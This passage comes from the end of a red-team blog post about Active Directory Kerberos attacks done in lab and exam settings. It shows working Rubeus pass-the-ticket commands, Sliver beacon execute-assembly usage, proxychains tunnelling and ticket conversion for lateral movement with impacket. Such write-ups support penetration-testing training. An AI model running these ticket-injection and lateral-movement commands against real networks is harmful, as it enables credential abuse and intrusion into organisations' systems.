<p>Import the ticket on Windows with <code>Rubeus.exe ptt /ticket:[base64_ticket]</code></p>
<p><img src="https://i.gyazo.com/4793ff075f9fe172b2046b17e79bb3cb.png" alt="40"></p>
<p>We can see that our ticket was successfully imported with <code>Rubeus.exe klist</code></p>
<p><img src="https://i.gyazo.com/0a3f39e66fd22109e3c575aa450ebbb4.png" alt="41"></p>
<p>We can verify that our ticket works by listing shares on the target, although in hindsight <code>ADMIN$</code> would be a better share to check :P</p>
<pre><code>ls <span class="hljs-regexp">//</span>[IP<span class="hljs-regexp">/FQDN]/</span>c$
</code></pre><p><img src="https://i.gyazo.com/0af73f5bbfaa8ad3780c1cbaefc2e1c4.png" alt="42"></p>
<h2 id="why-you-shouldn-t-perform-attacks-from-linux">Why you <strong>shouldn&#39;t</strong> perform attacks from Linux</h2>
<p>As was briefly discussed in <a href="#the-curious-case-of-bloodhound-python">The Curious Case of Bloodhound-Python</a>, tools on Linux are not as stable as you would expect them to be. This is due to the fact that most tools are community-driven and are not as well-maintained as their Windows counterparts.</p>
<p>Furthermore, this blog post heavily featured the use of an inband socks proxy as well as <code>proxychains</code> to proxy commands through the workstation. This may not be feasible in real world engagements, as the inband socks proxy essentially forces beacon to permanently run in <code>interactive</code> mode or <code>sleep 0</code> as any <code>sleep</code> duration may cause some protocols to break.</p>
<h2 id="cheatsheet-faqs">Cheatsheet &amp; FAQs</h2>
<p><strong>Q</strong>: Why are you censoring Kerberos tickets that will expire by the time this post is released?<br><strong>A:</strong> In some cases, tickets can be cracked and I don&#39;t want to get in trouble. :P</p>
<h3 id="proxychains">Proxychains</h3>
<p>This wrapper simply proxies the rest of your command through a Socks5 proxy defined in <code>/etc/proxychains4.conf</code>. When you start Sliver&#39;s <code>socks5</code> proxy by default: it opens port 1081 on the <strong>operator&#39;s</strong> machine.</p>
<p><img src="https://i.gyazo.com/afee2d86d20464acc09a43755606d9c9.png" alt="43"></p>
<p>Remote connections will resemble the following -&gt; <code>getST.py -&gt; 127.0.0.1:1081 -&gt; WKSTN-1 (BEACON) -&gt; WKSTN-2</code></p>
<p>This effectively allows you to access internal hosts via beacon, however as mentioned above; requires beacon to be running in <code>interactive</code> mode or <code>sleep 0</code>.</p>
<h3 id="base64-kirbi-ccache">Base64 -&gt; .kirbi -&gt; .ccache</h3>
<p>When you forge/request tickets with Rubeus, you generally get your tickets back in the <code>stdout</code> as <code>base64 ( kirbi )</code>. Alternatively, you can specify <code>/outfile</code> and the base64 wrapping wil be omitted.</p>
<p>If you want to transfer this over to Linux, you&#39;ll have to either base64 encode it and copy paste it over to Linux; or download the <code>.kirbi</code> file over the wire.</p>
<h4 id="windows-linux">Windows -&gt; Linux</h4>
<pre><code class="lang-sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">"doI...[snip]..."</span> | base64 <span class="hljs-_">-d</span>  &gt; ticket.kirbi &amp;&amp; ticketConverter.py ticket.kirbi ticket.ccache &amp;&amp; <span class="hljs-built_in">export</span> KRB5CCNAME=ticket.ccache

nxc smb [...] --use-kcache
impacket*.py -k -no-pass

<span class="hljs-built_in">unset</span> KRB5CCNAME
</code></pre>
<h4 id="linux-windows">Linux -&gt; Windows</h4>
<p>Some tools will save the resulting ticket as a usable <code>.ccache</code> file, others will do so with <code>.kirbi</code>; please exercise intuition. I&#39;d recommend using <code>describeTicket.py</code> to validate your <code>.ccache</code> before attempting to use it in Windows as you may get ungodly errors.</p>
<p><code>base64</code> is ran with the <code>-w 0</code> flag to eliminate newlines when encoding the <code>.kirbi</code> file.</p>
<p><img src="https://i.gyazo.com/c689c21205779e1d9bcd27bb79afc41a.jpg" alt="44"></p>
<pre><code class="lang-sh">impacket*.py [...] 
ticketConverter.py ticket.ccache ticket.kirbi

cat ticket.kirbi | base64 -w 0 
<span class="hljs-built_in">
execute-assembly </span>-i Rubeus.exe ptt /ticket:doI...[snip]...<span class="hljs-built_in">
execute-assembly </span>-i Rubeus.exe ptt /ticket:ticket.kirbi
<span class="hljs-built_in">
execute-assembly </span>-i Rubeus.exe klist
</code></pre>
<p><code>execute-assembly</code> is ran with the <code>-i</code> flag due to the character limit in beacon&#39;s <code>execute-assembly</code> fork and run. </p>
<p><code>-i</code> tasks beacon to run the assembly inline, be careful when using this flag as it may cause beacon to crash if the assembly errors out.</p>
<p>If you are unable to pass the base64 ticket to <code>Rubeus.exe ptt</code>, due to other constraints; you can simply drop <code>.kirbi</code> to disk and reference it with <code>Rubeus.exe ptt /ticket:[ticket.kirbi]</code>.</p>
<h2 id="closing-thoughts">Closing Thoughts</h2>
<p>I prefer to perform <strong>all</strong> attacks from Linux, as well as utilizing the tickets to perform lateral movement from Linux. These opinions are based strictly on a lab/examination perspective, where <strong>speed often takes priority over stealth</strong>.</p>
<p>These opinions do not reflect my stance on real-world engagements where <strong>speed</strong> is a non-factor.</p>
<p>In the context of solving labs and examinations quickly and easily, the following reasons are why I prefer to perform attacks from Linux:</p>
<ol>
<li>Kerberos Double Hop Problem<ul>
<li>This no longer exists</li>
</ul>
</li>
<li>PowerShell Constrained Language Mode (CLM)<ul>
<li>This no longer exists, for the most part.</li>
</ul>
</li>
<li>Anti-Virus Detection<ul>
<li>You don&#39;t have to pray that your <code>execute-assembly</code> ticked off the AV gods anymore.</li>
</ul>
</li>
<li>Debugging<ul>
<li>You can actually modify the source code of your tools without recompiling them now!</li>
</ul>
</li>
<li>Stability<ul>
<li>Lab workstations are extremely unstable, and you don&#39;t want to be guessing whether the issue is with the lab, with your tools or with Windows.</li>
</ul>
</li>
<li>Speed<ul>
<li>All of the above points contribute to this; you can perform attacks much faster from Linux.</li>
</ul>
</li>
</ol>
<p>That being said, performing attacks from Linux is not <strong>theoretically faster</strong> than performing attacks from Windows; in fact it is quite the opposite. However, from my experience, the majority of the time spent on attacking Active Directory Environments is actually just debugging issues and not the actual attack itself.</p>
<p>For what it&#39;s worth, I completed the CRTP and CRTE exams in 1 hour and 3 hours respectively; and I attribute this to the fact that I was able to debug issues much faster from Linux.</p>
